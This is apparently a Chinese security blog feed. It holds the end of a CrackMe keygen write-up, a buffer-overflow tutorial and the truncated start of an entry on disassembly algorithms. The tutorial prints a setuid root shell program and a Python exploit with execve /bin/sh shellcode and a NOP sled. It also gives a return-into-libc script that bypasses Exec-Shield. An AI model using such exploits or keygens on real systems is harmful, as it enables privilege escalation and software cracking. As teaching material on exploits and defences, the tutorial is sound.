&lt;jmp.&amp;MSVBVM50._adj_fdivr_m64&gt;</span><br><span class="line">0040860A   &gt;  DFE0          fstsw ax                                 ;  // 把结果送入ax</span><br><span class="line">0040860C   .  A8 0D         test al,0xD</span><br><span class="line">0040860E   .  0F85 AB010000 jnz 004087BF</span><br><span class="line">00408614   .  FF15 34B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFpR8&gt;&gt;;  msvbvm50.__vbaFpR8</span><br><span class="line">0040861A   .  DC1D 28104000 fcomp qword ptr ds:[0x401028]</span><br><span class="line">00408620   .  DFE0          fstsw ax                                 ;  //ax=20</span><br><span class="line">00408622   .  F6C4 40       test ah,0x40                             ;  // ah=40</span><br><span class="line">00408625   .  74 07         je short 0040862E</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CrackMe160.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">// 003</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream&quot;</span></span></span><br><span class="line">  </span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;160CrackMe-003 Name/Serial\r\n\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">    gets_s(buff,<span class="number">100</span>);</span><br><span class="line">    <span class="type">int</span> nLen = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">if</span> ( nLen &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> nRet = nLen * <span class="number">0x15B38</span>;</span><br><span class="line">        nRet += buff[<span class="number">0</span>];</span><br><span class="line">        <span class="type">double</span> dRet = (<span class="type">double</span>)nRet;</span><br><span class="line">        dRet += (<span class="number">10.0</span>/<span class="number">5.0</span>);</span><br><span class="line">        dRet *= <span class="number">3.0</span>;</span><br><span class="line">        dRet -= <span class="number">2</span>;</span><br><span class="line">        dRet -= <span class="number">-15</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Serial：%d\r\n&quot;</span>,(<span class="type">int</span>)dRet);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Input error!\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>先计算出Name的长度nLen,然后edi=edi*0x15B38+cName, cName是Name第一个字符的ANSI码。然后，计算浮点数10.0/5.0=2.0, edi转换为浮点数，加上2.0，然后结果再乘以3.0，然后减去2，然后再减去-15，得到的值转换为文本，即为正确的序列号。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>缓冲区溢出</title>
      <link href="/2023/12/18/Security/binary/reverse/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
      <url>/2023/12/18/Security/binary/reverse/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="利用缓冲区溢出来执行任意代码">利用缓冲区溢出来执行任意代码</h4><h5 id="1-缓冲区溢出示例">1、缓冲区溢出示例</h5><p>缓冲区溢出（buffer overflow）：最有名的漏洞之一，输入的数据超出了程序规定的内存范围，数据溢出导致程序发生异常。</p><p>eg.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序为 buff 数组分配了一块 64 字节的内存空间，但传递给程序的 参数 argv[1] 是由用户任意输入的，因此参数的长度很有可能会超过 64 字节</p><p>因此，当用户故意向程序传递一个超过 64 字节的字符串时，就会在 main 函数中引发缓冲区溢出。</p><h5 id="2-让普通用户用root权限运行程序">2、让普通用户用ROOT权限运行程序</h5><p>setuid ：让用户使用程序的所有者权限来运行程序</p><p>一个 sample</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *data[<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span> *exe = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    data[<span class="number">0</span>] = exe;</span><br><span class="line">    data[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>); <span class="comment">//使用了setuid</span></span><br><span class="line">    <span class="built_in">execve</span>(data[<span class="number">0</span>], data, <span class="literal">NULL</span>); <span class="comment">//调用/bin/sh</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以root权限编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su -i</span><br><span class="line">gcc -Wall sample.c -o sample</span><br><span class="line"><span class="built_in">chmod</span> 4755 sample </span><br><span class="line"><span class="built_in">ls</span> -l sample</span><br></pre></td></tr></table></figure><h5 id="3-通过缓冲区溢出夺取权限示例">3、通过缓冲区溢出夺取权限示例</h5><p>一个有漏洞的sample：会将输入的字符串原原本本地复制到一块只有 64 字节的内存空间中，由于字符串是由用户任意输入的，会有缓存溢出漏洞</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="title">get_sp</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;movl %esp, %eax&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cpy</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%08lx&quot;</span>, <span class="built_in">get_sp</span>() + <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="built_in">strcpy</span>(buff, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cpy</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">addr = <span class="number">0x41414141</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">addr = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">s  = <span class="string">&quot;&quot;</span></span><br><span class="line">s += <span class="string">&quot;\x31\xc0\x50\x89\xe0\x83\xe8\x10&quot;</span> <span class="comment"># 8</span></span><br><span class="line">s += <span class="string">&quot;\x50\x89\xe3\x31\xc0\x50\x68\x2f&quot;</span> <span class="comment">#16</span></span><br><span class="line">s += <span class="string">&quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e&quot;</span> <span class="comment">#24</span></span><br><span class="line">s += <span class="string">&quot;\x89\xe2\x31\xc0\x50\x53\x52\x50&quot;</span> <span class="comment">#32</span></span><br><span class="line">s += <span class="string">&quot;\xb0\x3b\xcd\x80\x90\x90\x90\x90&quot;</span> <span class="comment">#40</span></span><br><span class="line">s += <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> <span class="comment">#48</span></span><br><span class="line">s += <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> <span class="comment">#56</span></span><br><span class="line">s += <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> <span class="comment">#64</span></span><br><span class="line">s += <span class="string">&quot;\x90\x90\x90\x90&quot;</span>+pack(<span class="string">&#x27;&lt;L&#x27;</span>,addr) <span class="comment">#72</span></span><br><span class="line"></span><br><span class="line">sys.stdout.write(s)</span><br></pre></td></tr></table></figure><p>将 <a href="http://exploit.py">exploit.py</a> 的输出结果输入给 sample.c，我们就成功地以 root 权限运行了 /bin/sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sample <span class="string">&quot;`python exploit.py bfbfebe8`&quot;</span></span><br></pre></td></tr></table></figure><p>4、执行任意代码的原理<br>在函数调用的结构中会用到栈的概念</p><p>一个sample：</p><ul><li><p>func 函数有三个参数，分别传递了 1、2、3 三个数字</p></li><li><p>func 函数内部没有进行任何处理</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.file&quot;sample4.c&quot;</span><br><span class="line">.text</span><br><span class="line">.p2align 4,,15</span><br><span class="line">.globl func</span><br><span class="line">.typefunc, @function</span><br><span class="line">func:</span><br><span class="line">pushl%ebp保存ebp</span><br><span class="line">movl%esp, %ebp将ebp移动到esp的位置</span><br><span class="line">subl$16, %esp</span><br><span class="line">leave恢复ebp和esp</span><br><span class="line">ret跳转到调用该函数的位置</span><br><span class="line">.sizefunc, .-func</span><br><span class="line">.p2align 4,,15</span><br><span class="line">.globl main</span><br><span class="line">.typemain, @function</span><br><span class="line">main:</span><br><span class="line">leal4(%esp), %ecx</span><br><span class="line">andl$-16, %esp</span><br><span class="line">pushl-4(%ecx)</span><br><span class="line">pushl%ebp</span><br><span class="line">movl%esp, %ebp</span><br><span class="line">pushl%ecx</span><br><span class="line">subl$12, %esp先将参数放入栈中</span><br><span class="line">movl$3, 8(%esp)参数3</span><br><span class="line">movl$2, 4(%esp)参数2</span><br><span class="line">movl$1, (%esp)参数1</span><br><span class="line">callfunc调用func</span><br><span class="line">movl$0, %eax</span><br><span class="line">addl$12, %esp</span><br><span class="line">popl%ecx</span><br><span class="line">popl%ebp</span><br><span class="line">leal-4(%ecx), %esp</span><br><span class="line">ret</span><br><span class="line">.sizemain, .-main</span><br><span class="line">.ident&quot;GCC: (GNU) 4.2.2 20070831 prerelease [FreeBSD]&quot;</span><br></pre></td></tr></table></figure><p>当调用 func 函数时，在跳转到函数起始地址的瞬间，栈的情形如下图 所示：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261023600.png" alt="img"></p><p>接下来， push ebp，esp 继续递减，为函数内部的局部变量分配内存空间</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261023096.png" alt="在这里插入图片描述"></p><p>这时，如果数据溢出，超过了原本分配给数组 buff 的内存空间，数组 buff 后面的 %ebp、ret_addr 以及传递给 func 函数的参数都会被溢出的数据覆盖掉</p><p>ret_addr 存放的是函数逻辑结束后返回 main 函数的目标地址。也就是说，如果覆盖了 ret_addr，攻击者就可以让程序跳转到任意地址。如果攻击者事先准备一段代码，然后让程序跳转到这段代码，也就相当于成功攻击了“可执行任意代码的漏洞”</p><h4 id="防御攻击的技术">防御攻击的技术</h4><h5 id="1-aslr">1、ASLR</h5><p>地址空间布局随机化（Address Space Layout Randomization, ASLR）: 一种对栈、模块、动态分配的内存空间等的地址（位置）进行随机配置的机制，属于操作系统的功能。</p><p>一个test: 在启用ASLR的状态下，反复运行这个程序，我们会发现每次显示的地址都不同</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $ gcc test00.c -o test00</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="title">get_sp</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(<span class="string">&quot;movl %esp, %eax&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;malloc: %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">16</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot; stack: 0x%lx\n&quot;</span>, <span class="built_in">get_sp</span>());</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当启用 ASLR 时，程序所显示的地址每次都不同，因此，我们无法将正确的地址传递给 exp，也就无法成功夺取系统权限了</p><h5 id="2-exec-shield">2、Exec-Shield</h5><p>Exec-Shield ：一种通过“限制内存空间的读写和执行权限”来防御攻击的机制，除存放可执行代码的内存空间以外，对其余内存空间尽量禁用执行权限</p><ul><li>通常情况下我们不会在用作栈的内存空间里存放可执行的机器语言代码，因此我们可以将栈空间的权限设为可读写但不可执行</li><li>在代码区域中存放的机器语言代码，通常情况下也不需要在运行时进行改写，因此我们可以将这部分内存的权限设置为不可写入</li><li>这样一来，即便我们将 shellcode 复制到栈，如果这些代码无法执行， 那么就会产生 Segmentation fault，导致程序停止运行</li></ul><p>注：要在系统中查看某个程序进程内存空间的读写和执行权限，在程序运行时输出 /proc/<PID>/maps 就可以</p><h6 id="3-stackguard">3、StackGuard</h6><p>StackGuard：一种在编译时在各函数入口和出口插入用于检测栈数据完整性的机器语言代码的方法，它属于编译器的安全机制</p><p>一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">.file&quot;test.c&quot;</span><br><span class="line">.text</span><br><span class="line">.globl get_sp</span><br><span class="line">.typeget_sp, @function</span><br><span class="line">get_sp:</span><br><span class="line">pushl%ebp</span><br><span class="line">movl%esp, %ebp</span><br><span class="line">#APP</span><br><span class="line"># 5 &quot;test.c&quot; 1</span><br><span class="line">movl %esp, %eax</span><br><span class="line">addl $0x58, %eax</span><br><span class="line"># 0 &quot;&quot; 2</span><br><span class="line">#NO_APP</span><br><span class="line">popl%ebp</span><br><span class="line">ret</span><br><span class="line">.sizeget_sp, .-get_sp</span><br><span class="line">.section.rodata</span><br><span class="line">.LC0:</span><br><span class="line">.string&quot;0x%08lx&quot;</span><br><span class="line">.text</span><br><span class="line">.globl main</span><br><span class="line">.typemain, @function</span><br><span class="line">main:</span><br><span class="line">pushl%ebp</span><br><span class="line">movl%esp, %ebp</span><br><span class="line">andl$-16, %esp</span><br><span class="line">subl$64, %esp</span><br><span class="line">movl12(%ebp), %eax</span><br><span class="line">movl%eax, 28(%esp)</span><br><span class="line">movl%gs:20, %eax每次运行时%gs:20中都会存入一个随机数</span><br><span class="line">movl%eax, 60(%esp)将随机值添加到栈的最后，由于 60(%esp) 后面就是 ebp 和 ret_addr， 因此这样的配置可以保护关键地址的数据不被篡改</span><br><span class="line">xorl%eax, %eax</span><br><span class="line">callget_sp</span><br><span class="line">movl$.LC0, %edx</span><br><span class="line">movl%eax, 4(%esp)</span><br><span class="line">movl%edx, (%esp)</span><br><span class="line">callprintf</span><br><span class="line">callgetchar</span><br><span class="line">movl28(%esp), %eax</span><br><span class="line">addl$4, %eax</span><br><span class="line">movl(%eax), %eax</span><br><span class="line">movl%eax, 4(%esp)</span><br><span class="line">leal44(%esp), %eax</span><br><span class="line">movl%eax, (%esp)</span><br><span class="line">callstrcpy</span><br><span class="line">movl$0, %eax</span><br><span class="line">movl60(%esp), %edx将栈的最后一个值</span><br><span class="line">xorl%gs:20, %edx与%gs:20进行对比</span><br><span class="line">je.L5如果一致则跳转到.L5</span><br><span class="line">call__stack_chk_fail否则跳转到强制终止代码</span><br><span class="line">.L5:</span><br><span class="line">leave</span><br><span class="line">ret</span><br><span class="line">.sizemain, .-main</span><br><span class="line">.ident&quot;GCC: (Ubuntu 4.4.3-4ubuntu5) 4.4.3&quot;</span><br><span class="line">#.section.note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure><p>简单来说，StackGuard 机制所保护的是 <code>ebp</code> 和 <code>ret_addr</code>，是一种针对典型栈缓冲区溢出攻击的防御手段。</p><h4 id="绕开安全机制的技术">绕开安全机制的技术</h4><h5 id="1-return-into-libc">1、Return-into-libc</h5><p>Return-into-libc 是一种破解 Exec-Shield 的方法</p><p>思路：即便无法执行任意代码，最终只要能够运行任意程序，也可以夺取系统权限<br>原理：通过调整参数和栈的配置，使得程序能够跳转到 <a href="http://libc.so">libc.so</a> 中的 system 函数以及 exec 类函数，借此来运行 /bin/sh 等 程序。<br>exp如下：system 函数的返回目标设为 exit，并将 /bin/sh 的地址作为参数传递过去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from struct import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 2:</span><br><span class="line">addr = 0x41414141</span><br><span class="line">else:</span><br><span class="line">addr = int(sys.argv[1], 16) + 0x08</span><br><span class="line"></span><br><span class="line">fsystem = int(&quot;&lt;16进制system地址&gt;&quot;, 16)</span><br><span class="line">fexit   = int(&quot;&lt;16进制exit地址&gt;&quot;, 16)</span><br><span class="line"></span><br><span class="line">data  = &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">data += &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">data += &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">data += &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">data += pack(&#x27;&lt;L&#x27;, fsystem)</span><br><span class="line">data += pack(&#x27;&lt;L&#x27;, fexit)</span><br><span class="line">data += pack(&#x27;&lt;L&#x27;, addr)</span><br><span class="line">data += &quot;/bin/sh&quot;</span><br><span class="line"></span><br><span class="line">sys.stdout.write(data)</span><br></pre></td></tr></table></figure><h5 id="2-rop">2、ROP</h5><p>面向返回编程（Return-Oriented-Programming，ROP）：利用未随机化的那些模块内部的汇编代码，拼接出我们所需要的程序逻辑，第5章再提</p><p>结语<br>主要是最经典最基础的缓冲区溢出的介绍，然后有些基础防御和绕过</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反汇编算法</title>
      <link href="/2023/12/18/Security/binary/reverse/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%AE%97%E6%B3%95/"/>
      <url>/2023/12/18/Security/binary/reverse/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>线性扫描（ linear sweep）和递归下降（ recursive descent）是两种最主要的反汇编算法。</p></blockquote><h2 id="线性扫描反汇编">线性扫描反汇编</h2><p>线性扫描反汇编算法采用一种非常简单的方法来确定需要反汇编的指令的位置：<mark>一条指令结束、另一条指令开始的地方。</mark></p><p>因此，确定起始位置最为困难。常用的解决办法是，假设程序中标注为代码（通常由程序文件的头部指定）的节所包含的全部是机器语言指令。反汇编从一个代码段的第一个字节开始，以线性模式扫描整个代码段，逐条反汇编每条指令，直到完成整个代码段。<mark>这种算法并不会通过识别分支等非线性指令来了解程序的控制流。</mark></p><p>进行反汇编时，可以维护一个指针来标注当前正在反汇编的指令的起始位置。在反汇编过程中，每一条指令的长度都被计算出来，并用来确定下一条将要反汇编的指令的位置。为此，对由长度固定的指令构成的指令集（如 MIPS）进行反汇编有时会更加容易，因为这时可轻松定位随后的指令。</p><p><u><mark>线性扫描算法的主要优点，在于它能够完全覆盖程序的所有代码段。线性扫描方法的一个主要缺点，是它没有考虑到代码中可能混有数据。</mark></u></p><blockquote><p>GNU 调试器（ gdb）、微软公司的 WinDbg 调试器和 objdump 实用工具的反汇编引擎均采用线性扫描算法。</p></blockquote><h2 id="递归下降反汇编">递归下降反汇编</h2><p>递归下降采用另外一种不同的方法来定位指令。<mark>递归下降算法强调控制流的概念</mark>。控制流根据一条指令是否被另一条指令引用来决定是否对其进行反汇编。</p><ol><li>顺序流指令</li></ol><p>**顺序流指令将执行权传递给紧随其后的下一条指令。**顺序流指令的例子包括简单算术指令，如 add；寄存器与内存之间的传输指令，如 mov；栈操作指令，如 push 和 pop。这些指令的反汇编过程以线性扫描方式进行。</p><ol start="2"><li>条件分支指令</li></ol><p>**条件分支指令（如 x86 jnz）提供两条可能的执行路径。**如果条件为真，则执行分支，并且必须修改指令指针，使其指向分支的目标。但是，如果条件为假，则继续以线性模式执行指令，并使用线性扫描方法反汇编下一条指令。因为不可能在静态环境中确定条件测试的结果，递归下降算法会反汇编上述两条路径。同时，<u>它将分支目标指令的地址添加到稍后才进行反汇编的地址列表中，从而推迟分支目标指令的反汇编过程。</u></p><ol 